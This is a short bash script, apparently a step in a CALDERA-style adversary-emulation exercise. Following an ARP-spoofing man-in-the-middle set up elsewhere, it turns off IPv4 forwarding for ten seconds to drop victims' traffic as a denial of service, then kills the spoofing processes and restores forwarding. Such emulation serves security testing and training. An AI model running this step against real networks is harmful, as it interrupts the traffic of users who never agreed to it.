#!/usr/bin/env bash
set -euo pipefail

source /opt/caldera/common/require-tools.sh

PIDFILE="$DATA_PATH/KC2/arp_pids"
TIME_DOS=10

# Installing dependencies
require_tools sysctl

echo "DOS enabled for $TIME_DOS seconds"
sysctl -w net.ipv4.ip_forward=0 >/dev/null
sleep $TIME_DOS

echo "Removing arp spoofing..."
/opt/caldera/common/remove-pids.sh "$PIDFILE" || echo "[WARN] remove-pids failed" >&2
sysctl -w net.ipv4.ip_forward=1 >/dev/null
